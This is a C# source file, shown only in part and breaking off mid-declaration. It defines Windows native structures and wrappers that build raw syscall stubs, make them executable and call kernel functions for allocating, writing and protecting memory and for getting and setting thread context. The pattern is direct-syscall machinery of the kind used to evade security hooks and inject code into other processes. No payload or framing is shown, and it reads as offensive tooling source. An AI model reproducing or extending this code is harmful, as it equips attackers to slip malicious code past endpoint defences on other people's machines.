using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;

public class Code
{

	    public enum NTSTATUS : uint
	    {
	        Success = 0x00000000,
	        Wait0 = 0x00000000,
	        Wait1 = 0x00000001,
	        Wait2 = 0x00000002,
	        Wait3 = 0x00000003,
	        Wait63 = 0x0000003f,
	        Abandoned = 0x00000080,
	        AbandonedWait0 = 0x00000080,
	        AbandonedWait1 = 0x00000081,
	        AbandonedWait2 = 0x00000082,
	        AbandonedWait3 = 0x00000083,
	        AbandonedWait63 = 0x000000bf,
	        UserApc = 0x000000c0,
	        KernelApc = 0x00000100,
	        Alerted = 0x00000101,
	        Timeout = 0x00000102,
	        Pending = 0x00000103,
	        Reparse = 0x00000104,
	        MoreEntries = 0x00000105,
	        NotAllAssigned = 0x00000106,
	        SomeNotMapped = 0x00000107,
	        OpLockBreakInProgress = 0x00000108,
	        VolumeMounted = 0x00000109,
	        RxActCommitted = 0x0000010a,
	        NotifyCleanup = 0x0000010b,
	        NotifyEnumDir = 0x0000010c,
	        NoQuotasForAccount = 0x0000010d,
	        PrimaryTransportConnectFailed = 0x0000010e,
	        PageFaultTransition = 0x00000110,
	        PageFaultDemandZero = 0x00000111,
	        PageFaultCopyOnWrite = 0x00000112,
	        PageFaultGuardPage = 0x00000113,
	        PageFaultPagingFile = 0x00000114,
	        CrashDump = 0x00000116,
	        ReparseObject = 0x00000118,
	        NothingToTerminate = 0x00000122,
	        ProcessNotInJob = 0x00000123,
	        ProcessInJob = 0x00000124,
	        ProcessCloned = 0x00000129,
	        FileLockedWithOnlyReaders = 0x0000012a,
	        FileLockedWithWriters = 0x0000012b,
	        Informational = 0x40000000,
	        ObjectNameExists = 0x40000000,
	        ThreadWasSuspended = 0x40000001,
	        WorkingSetLimitRange = 0x40000002,
	        ImageNotAtBase = 0x40000003,
	        RegistryRecovered = 0x40000009,
	        Warning = 0x80000000,
	        GuardPageViolation = 0x80000001,
	        DatatypeMisalignment = 0x80000002,
	        Breakpoint = 0x80000003,
	        SingleStep = 0x80000004,
	        BufferOverflow = 0x80000005,
	        NoMoreFiles = 0x80000006,
	        HandlesClosed = 0x8000000a,
	        PartialCopy = 0x8000000d,
	        DeviceBusy = 0x80000011,
	        InvalidEaName = 0x80000013,
	        EaListInconsistent = 0x80000014,
	        NoMoreEntries = 0x8000001a,
	        LongJump = 0x80000026,
	        DllMightBeInsecure = 0x8000002b,
	        Error = 0xc0000000,
	        Unsuccessful = 0xc0000001,
	        NotImplemented = 0xc0000002,
	        InvalidInfoClass = 0xc0000003,
	        InfoLengthMismatch = 0xc0000004,
	        AccessViolation = 0xc0000005,
	        InPageError = 0xc0000006,
	        PagefileQuota = 0xc0000007,
	        InvalidHandle = 0xc0000008,
	        BadInitialStack = 0xc0000009,
	        BadInitialPc = 0xc000000a,
	        InvalidCid = 0xc000000b,
	        TimerNotCanceled = 0xc000000c,
	        InvalidParameter = 0xc000000d,
	        NoSuchDevice = 0xc000000e,
	        NoSuchFile = 0xc000000f,
	        InvalidDeviceRequest = 0xc0000010,
	        EndOfFile = 0xc0000011,
	        WrongVolume = 0xc0000012,
	        NoMediaInDevice = 0xc0000013,
	        NoMemory = 0xc0000017,
	        ConflictingAddresses = 0xc0000018,
	        NotMappedView = 0xc0000019,
	        UnableToFreeVm = 0xc000001a,
	        UnableToDeleteSection = 0xc000001b,
	        IllegalInstruction = 0xc000001d,
	        AlreadyCommitted = 0xc0000021,
	        AccessDenied = 0xc0000022,
	        BufferTooSmall = 0xc0000023,
	        ObjectTypeMismatch = 0xc0000024,
	        NonContinuableException = 0xc0000025,
	        BadStack = 0xc0000028,
	        NotLocked = 0xc000002a,
	        NotCommitted = 0xc000002d,
	        InvalidParameterMix = 0xc0000030,
	        ObjectNameInvalid = 0xc0000033,
	        ObjectNameNotFound = 0xc0000034,
	        ObjectNameCollision = 0xc0000035,
	        ObjectPathInvalid = 0xc0000039,
	        ObjectPathNotFound = 0xc000003a,
	        ObjectPathSyntaxBad = 0xc000003b,
	        DataOverrun = 0xc000003c,
	        DataLate = 0xc000003d,
	        DataError = 0xc000003e,
	        CrcError = 0xc000003f,
	        SectionTooBig = 0xc0000040,
	        PortConnectionRefused = 0xc0000041,
	        InvalidPortHandle = 0xc0000042,
	        SharingViolation = 0xc0000043,
	        QuotaExceeded = 0xc0000044,
	        InvalidPageProtection = 0xc0000045,
	        MutantNotOwned = 0xc0000046,
	        SemaphoreLimitExceeded = 0xc0000047,
	        PortAlreadySet = 0xc0000048,
	        SectionNotImage = 0xc0000049,
	        SuspendCountExceeded = 0xc000004a,
	        ThreadIsTerminating = 0xc000004b,
	        BadWorkingSetLimit = 0xc000004c,
	        IncompatibleFileMap = 0xc000004d,
	        SectionProtection = 0xc000004e,
	        EasNotSupported = 0xc000004f,
	        EaTooLarge = 0xc0000050,
	        NonExistentEaEntry = 0xc0000051,
	        NoEasOnFile = 0xc0000052,
	        EaCorruptError = 0xc0000053,
	        FileLockConflict = 0xc0000054,
	        LockNotGranted = 0xc0000055,
	        DeletePending = 0xc0000056,
	        CtlFileNotSupported = 0xc0000057,
	        UnknownRevision = 0xc0000058,
	        RevisionMismatch = 0xc0000059,
	        InvalidOwner = 0xc000005a,
	        InvalidPrimaryGroup = 0xc000005b,
	        NoImpersonationToken = 0xc000005c,
	        CantDisableMandatory = 0xc000005d,
	        NoLogonServers = 0xc000005e,
	        NoSuchLogonSession = 0xc000005f,
	        NoSuchPrivilege = 0xc0000060,
	        PrivilegeNotHeld = 0xc0000061,
	        InvalidAccountName = 0xc0000062,
	        UserExists = 0xc0000063,
	        NoSuchUser = 0xc0000064,
	        GroupExists = 0xc0000065,
	        NoSuchGroup = 0xc0000066,
	        MemberInGroup = 0xc0000067,
	        MemberNotInGroup = 0xc0000068,
	        LastAdmin = 0xc0000069,
	        WrongPassword = 0xc000006a,
	        IllFormedPassword = 0xc000006b,
	        PasswordRestriction = 0xc000006c,
	        LogonFailure = 0xc000006d,
	        AccountRestriction = 0xc000006e,
	        InvalidLogonHours = 0xc000006f,
	        InvalidWorkstation = 0xc0000070,
	        PasswordExpired = 0xc0000071,
	        AccountDisabled = 0xc0000072,
	        NoneMapped = 0xc0000073,
	        TooManyLuidsRequested = 0xc0000074,
	        LuidsExhausted = 0xc0000075,
	        InvalidSubAuthority = 0xc0000076,
	        InvalidAcl = 0xc0000077,
	        InvalidSid = 0xc0000078,
	        InvalidSecurityDescr = 0xc0000079,
	        ProcedureNotFound = 0xc000007a,
	        InvalidImageFormat = 0xc000007b,
	        NoToken = 0xc000007c,
	        BadInheritanceAcl = 0xc000007d,
	        RangeNotLocked = 0xc000007e,
	        DiskFull = 0xc000007f,
	        ServerDisabled = 0xc0000080,
	        ServerNotDisabled = 0xc0000081,
	        TooManyGuidsRequested = 0xc0000082,
	        GuidsExhausted = 0xc0000083,
	        InvalidIdAuthority = 0xc0000084,
	        AgentsExhausted = 0xc0000085,
	        InvalidVolumeLabel = 0xc0000086,
	        SectionNotExtended = 0xc0000087,
	        NotMappedData = 0xc0000088,
	        ResourceDataNotFound = 0xc0000089,
	        ResourceTypeNotFound = 0xc000008a,
	        ResourceNameNotFound = 0xc000008b,
	        ArrayBoundsExceeded = 0xc000008c,
	        FloatDenormalOperand = 0xc000008d,
	        FloatDivideByZero = 0xc000008e,
	        FloatInexactResult = 0xc000008f,
	        FloatInvalidOperation = 0xc0000090,
	        FloatOverflow = 0xc0000091,
	        FloatStackCheck = 0xc0000092,
	        FloatUnderflow = 0xc0000093,
	        IntegerDivideByZero = 0xc0000094,
	        IntegerOverflow = 0xc0000095,
	        PrivilegedInstruction = 0xc0000096,
	        TooManyPagingFiles = 0xc0000097,
	        FileInvalid = 0xc0000098,
	        InstanceNotAvailable = 0xc00000ab,
	        PipeNotAvailable = 0xc00000ac,
	        InvalidPipeState = 0xc00000ad,
	        PipeBusy = 0xc00000ae,
	        IllegalFunction = 0xc00000af,
	        PipeDisconnected = 0xc00000b0,
	        PipeClosing = 0xc00000b1,
	        PipeConnected = 0xc00000b2,
	        PipeListening = 0xc00000b3,
	        InvalidReadMode = 0xc00000b4,
	        IoTimeout = 0xc00000b5,
	        FileForcedClosed = 0xc00000b6,
	        ProfilingNotStarted = 0xc00000b7,
	        ProfilingNotStopped = 0xc00000b8,
	        NotSameDevice = 0xc00000d4,
	        FileRenamed = 0xc00000d5,
	        CantWait = 0xc00000d8,
	        PipeEmpty = 0xc00000d9,
	        CantTerminateSelf = 0xc00000db,
	        InternalError = 0xc00000e5,
	        InvalidParameter1 = 0xc00000ef,
	        InvalidParameter2 = 0xc00000f0,
	        InvalidParameter3 = 0xc00000f1,
	        InvalidParameter4 = 0xc00000f2,
	        InvalidParameter5 = 0xc00000f3,
	        InvalidParameter6 = 0xc00000f4,
	        InvalidParameter7 = 0xc00000f5,
	        InvalidParameter8 = 0xc00000f6,
	        InvalidParameter9 = 0xc00000f7,
	        InvalidParameter10 = 0xc00000f8,
	        InvalidParameter11 = 0xc00000f9,
	        InvalidParameter12 = 0xc00000fa,
	        MappedFileSizeZero = 0xc000011e,
	        TooManyOpenedFiles = 0xc000011f,
	        Cancelled = 0xc0000120,
	        CannotDelete = 0xc0000121,
	        InvalidComputerName = 0xc0000122,
	        FileDeleted = 0xc0000123,
	        SpecialAccount = 0xc0000124,
	        SpecialGroup = 0xc0000125,
	        SpecialUser = 0xc0000126,
	        MembersPrimaryGroup = 0xc0000127,
	        FileClosed = 0xc0000128,
	        TooManyThreads = 0xc0000129,
	        ThreadNotInProcess = 0xc000012a,
	        TokenAlreadyInUse = 0xc000012b,
	        PagefileQuotaExceeded = 0xc000012c,
	        CommitmentLimit = 0xc000012d,
	        InvalidImageLeFormat = 0xc000012e,
	        InvalidImageNotMz = 0xc000012f,
	        InvalidImageProtect = 0xc0000130,
	        InvalidImageWin16 = 0xc0000131,
	        LogonServer = 0xc0000132,
	        DifferenceAtDc = 0xc0000133,
	        SynchronizationRequired = 0xc0000134,
	        DllNotFound = 0xc0000135,
	        IoPrivilegeFailed = 0xc0000137,
	        OrdinalNotFound = 0xc0000138,
	        EntryPointNotFound = 0xc0000139,
	        ControlCExit = 0xc000013a,
	        PortNotSet = 0xc0000353,
	        DebuggerInactive = 0xc0000354,
	        CallbackBypass = 0xc0000503,
	        PortClosed = 0xc0000700,
	        MessageLost = 0xc0000701,
	        InvalidMessage = 0xc0000702,
	        RequestCanceled = 0xc0000703,
	        RecursiveDispatch = 0xc0000704,
	        LpcReceiveBufferExpected = 0xc0000705,
	        LpcInvalidConnectionUsage = 0xc0000706,
	        LpcRequestsNotAllowed = 0xc0000707,
	        ResourceInUse = 0xc0000708,
	        ProcessIsProtected = 0xc0000712,
	        VolumeDirty = 0xc0000806,
	        FileCheckedOut = 0xc0000901,
	        CheckOutRequired = 0xc0000902,
	        BadFileType = 0xc0000903,
	        FileTooLarge = 0xc0000904,
	        FormsAuthRequired = 0xc0000905,
	        VirusInfected = 0xc0000906,
	        VirusDeleted = 0xc0000907,
	        TransactionalConflict = 0xc0190001,
	        InvalidTransaction = 0xc0190002,
	        TransactionNotActive = 0xc0190003,
	        TmInitializationFailed = 0xc0190004,
	        RmNotActive = 0xc0190005,
	        RmMetadataCorrupt = 0xc0190006,
	        TransactionNotJoined = 0xc0190007,
	        DirectoryNotRm = 0xc0190008,
	        CouldNotResizeLog = 0xc0190009,
	        TransactionsUnsupportedRemote = 0xc019000a,
	        LogResizeInvalidSize = 0xc019000b,
	        RemoteFileVersionMismatch = 0xc019000c,
	        CrmProtocolAlreadyExists = 0xc019000f,
	        TransactionPropagationFailed = 0xc0190010,
	        CrmProtocolNotFound = 0xc0190011,
	        TransactionSuperiorExists = 0xc0190012,
	        TransactionRequestNotValid = 0xc0190013,
	        TransactionNotRequested = 0xc0190014,
	        TransactionAlreadyAborted = 0xc0190015,
	        TransactionAlreadyCommitted = 0xc0190016,
	        TransactionInvalidMarshallBuffer = 0xc0190017,
	        CurrentTransactionNotValid = 0xc0190018,
	        LogGrowthFailed = 0xc0190019,
	        ObjectNoLongerExists = 0xc0190021,
	        StreamMiniversionNotFound = 0xc0190022,
	        StreamMiniversionNotValid = 0xc0190023,
	        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
	        CantOpenMiniversionWithModifyIntent = 0xc0190025,
	        CantCreateMoreStreamMiniversions = 0xc0190026,
	        HandleNoLongerValid = 0xc0190028,
	        NoTxfMetadata = 0xc0190029,
	        LogCorruptionDetected = 0xc0190030,
	        CantRecoverWithHandleOpen = 0xc0190031,
	        RmDisconnected = 0xc0190032,
	        EnlistmentNotSuperior = 0xc0190033,
	        RecoveryNotNeeded = 0xc0190034,
	        RmAlreadyStarted = 0xc0190035,
	        FileIdentityNotPersistent = 0xc0190036,
	        CantBreakTransactionalDependency = 0xc0190037,
	        CantCrossRmBoundary = 0xc0190038,
	        TxfDirNotEmpty = 0xc0190039,
	        IndoubtTransactionsExist = 0xc019003a,
	        TmVolatile = 0xc019003b,
	        RollbackTimerExpired = 0xc019003c,
	        TxfAttributeCorrupt = 0xc019003d,
	        EfsNotAllowedInTransaction = 0xc019003e,
	        TransactionalOpenNotAllowed = 0xc019003f,
	        TransactedMappingUnsupportedRemote = 0xc0190040,
	        TxfMetadataAlreadyPresent = 0xc0190041,
	        TransactionScopeCallbacksNotSet = 0xc0190042,
	        TransactionRequiredPromotion = 0xc0190043,
	        CannotExecuteFileInTransaction = 0xc0190044,
	        TransactionsNotFrozen = 0xc0190045,
	        MaximumNtStatus = 0xffffffff
	};

	[Flags]
	public enum MemoryProtection : uint
	{
			AccessDenied = 0x0,
			Execute = 0x10,
			ExecuteRead = 0x20,
			ExecuteReadWrite = 0x40,
			ExecuteWriteCopy = 0x80,
			Guard = 0x100,
			NoCache = 0x200,
			WriteCombine = 0x400,
			NoAccess = 0x01,
			ReadOnly = 0x02,
			ReadWrite = 0x04,
			WriteCopy = 0x08,
			MEM_COMMIT = 0x00001000,
			MEM_RESERVE = 0x00002000
	}

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
  	const uint PAGE_EXECUTE_READWRITE = 0x40;

	  [Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
			THREAD_SUSPEND_RESUME_GET_CONTEXT_SET_CONTEXT = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_SUSPEND = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

	public enum CONTEXT_FLAGS : uint
	{
	   CONTEXT_i386 = 0x10000,
	   CONTEXT_i486 = 0x10000,
	   CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
	   CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
	   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
	   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
	   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
	   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
	   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
	   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
	}

	// x86 float save
	[StructLayout(LayoutKind.Sequential)]
	public struct FLOATING_SAVE_AREA
	{
		 public uint ControlWord;
		 public uint StatusWord;
		 public uint TagWord;
		 public uint ErrorOffset;
		 public uint ErrorSelector;
		 public uint DataOffset;
		 public uint DataSelector;
		 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		 public byte[] RegisterArea;
		 public uint Cr0NpxState;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct M128A
	{
		 public ulong High;
		 public long Low;

		 public override string ToString()
		 {
		return string.Format("High:{0}, Low:{1}", this.High, this.Low);
		 }
	}

	// x64 save format
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct XSAVE_FORMAT64
	{
		public ushort ControlWord;
		public ushort StatusWord;
		public byte TagWord;
		public byte Reserved1;
		public ushort ErrorOpcode;
		public uint ErrorOffset;
		public ushort ErrorSelector;
		public ushort Reserved2;
		public uint DataOffset;
		public ushort DataSelector;
		public ushort Reserved3;
		public uint MxCsr;
		public uint MxCsr_Mask;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public M128A[] FloatRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public M128A[] XmmRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
		public byte[] Reserved4;
	}

	// x64 context structure
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct CONTEXT64
	{
		public ulong P1Home;
		public ulong P2Home;
		public ulong P3Home;
		public ulong P4Home;
		public ulong P5Home;
		public ulong P6Home;

		public CONTEXT_FLAGS ContextFlags;
		public uint MxCsr;

		public ushort SegCs;
		public ushort SegDs;
		public ushort SegEs;
		public ushort SegFs;
		public ushort SegGs;
		public ushort SegSs;
		public uint EFlags;

		public ulong Dr0;
		public ulong Dr1;
		public ulong Dr2;
		public ulong Dr3;
		public ulong Dr6;
		public ulong Dr7;

		public ulong Rax;
		public ulong Rcx;
		public ulong Rdx;
		public ulong Rbx;
		public ulong Rsp;
		public ulong Rbp;
		public ulong Rsi;
		public ulong Rdi;
		public ulong R8;
		public ulong R9;
		public ulong R10;
		public ulong R11;
		public ulong R12;
		public ulong R13;
		public ulong R14;
		public ulong R15;
		public ulong Rip;

		public XSAVE_FORMAT64 DUMMYUNIONNAME;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
		public M128A[] VectorRegister;
		public ulong VectorControl;

		public ulong DebugControl;
		public ulong LastBranchToRip;
		public ulong LastBranchFromRip;
		public ulong LastExceptionToRip;
		public ulong LastExceptionFromRip;
		}


		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct OSVERSIONINFOEXW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public UInt16 wServicePackMajor;
        public UInt16 wServicePackMinor;
        public UInt16 wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }


		public struct STARTUPINFO
		{
				public int cb;
				public string lpReserved;
				public string lpDesktop;
				public string lpTitle;
				public int dwX;
				public int dwY;
				public int dwXSize;
				public int dwYSize;
				public int dwXCountChars;
				public int dwYCountChars;
				public int dwFillAttribute;
				public int dwFlags;
				public short wShowWindow;
				public short cbReserved2;
				public int lpReserved2;
				public IntPtr hStdInput;
				public IntPtr hStdOutput;
				public IntPtr hStdError;
		}

		public struct PROCESS_INFORMATION
		{
				public IntPtr hProcess;
				public IntPtr hThread;
				public int dwProcessId;
				public int dwThreadId;
		}
/*
		[StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public ulong Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public ulong Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }
*/

		[StructLayout(LayoutKind.Sequential,Pack=0)]
		public struct OBJECT_ATTRIBUTES
		{
		   public Int32 Length;
		   public IntPtr RootDirectory;
		   public IntPtr ObjectName;
		   public uint Attributes;
		   public IntPtr SecurityDescriptor;
		   public IntPtr SecurityQualityOfService;

		}


    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

		[Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }
/*
		[StructLayout(LayoutKind.Sequential)]
		public struct UNICODE_STRING
		{
				public UInt16 Length;
				public UInt16 MaximumLength;
				public IntPtr Buffer;
		}
*/


		[StructLayout(LayoutKind.Sequential, Pack=0)]
		public struct UNICODE_STRING
		{
		    public ushort Length;
		    public ushort MaximumLength;
		    public IntPtr Buffer;

		}



		public struct WIN_VER_INFO
		{
				public string chOSMajorMinor;
				public long dwBuildNumber;
				public UNICODE_STRING ProcName;
				public IntPtr hTargetPID;
				public string lpApiCall;
				public int SystemCall;
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ProtectorX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect );
		public static NTSTATUS Protector(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
		{
				IntPtr proc = GetProcAddress(Resolver(), "ZwProtectVirtualMemory");
				ProtectorX ProtectorFunc = (ProtectorX)Marshal.GetDelegateForFunctionPointer(proc, typeof(ProtectorX));
				return (NTSTATUS)ProtectorFunc( ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect );
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwProtectVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten);
		public static NTSTATUS ZwProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 16 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwProtectVirtualMemoryX ZwProtectVirtualMemoryFunc = (ZwProtectVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwProtectVirtualMemoryX));
                return (NTSTATUS)ZwProtectVirtualMemoryFunc( ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
            }
        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
		public static NTSTATUS ZwWriteVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                return (NTSTATUS)ZwWriteVirtualMemoryFunc(ProcessHandle, BaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }


		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwAllocateVirtualMemoryX( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect );
		public static NTSTATUS ZwAllocateVirtualMemory( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
		{
				byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
				unsafe
				{
						fixed (byte* ptr = syscall)
						{
								IntPtr allocMemAddress = (IntPtr)ptr;
								IntPtr allocMemAddressCopy = (IntPtr)ptr;
								UInt32 size = (uint)syscall.Length;
								IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
								ZwAllocateVirtualMemoryX ZwAllocateVirtualMemoryFunc = (ZwAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryX));
								return (NTSTATUS)ZwAllocateVirtualMemoryFunc(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);

						}
				}
		}


		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwGetContextThreadX( IntPtr ProcessHandle, ref CONTEXT64 context);
    public static NTSTATUS ZwGetContextThread( IntPtr ProcessHandle, ref CONTEXT64 context)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 12 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
								ZwGetContextThreadX ZwGetContextThreadFunc = (ZwGetContextThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwGetContextThreadX));
                return (NTSTATUS)ZwGetContextThreadFunc(ProcessHandle, ref context);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwSetContextThreadX( IntPtr ProcessHandle, CONTEXT64 context);
    public static NTSTATUS ZwSetContextThread( IntPtr ProcessHandle, CONTEXT64 context)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 11 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwSetContextThreadX ZwSetContextThreadFunc = (ZwSetContextThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwSetContextThreadX));
                return (NTSTATUS)ZwSetContextThreadFunc(ProcessHandle, context);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCloseX( IntPtr ProcessHandle);
    public static NTSTATUS ZwClose( IntPtr ProcessHandle)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 13 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwCloseX ZwCloseFunc = (ZwCloseX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCloseX));
                return (NTSTATUS)ZwCloseFunc(ProcessHandle);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
